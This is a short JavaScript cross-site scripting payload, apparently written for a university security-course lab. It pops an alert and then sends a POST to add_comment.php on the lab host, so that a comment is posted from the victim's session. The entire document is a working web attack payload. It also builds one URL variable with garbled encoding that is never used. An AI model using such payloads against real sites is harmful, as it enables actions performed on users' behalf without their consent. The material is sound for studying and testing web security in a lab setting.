<script>
	alert(1);
	var addCommentEvidence = new XMLHttpRequest(); 
	var date = new Date(); 
	var url = 'http://csec380-core.csec.rit.edu:86/add_comment.php?id%3D118%26comment%3D'%2B date;
	addCommentEvidence.open('POST', 'http://csec380-core.csec.rit.edu:86/add_comment.php?id=118&comment=hello2', true);
	addCommentEvidence.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

	addCommentEvidence.send();
	
</script> 
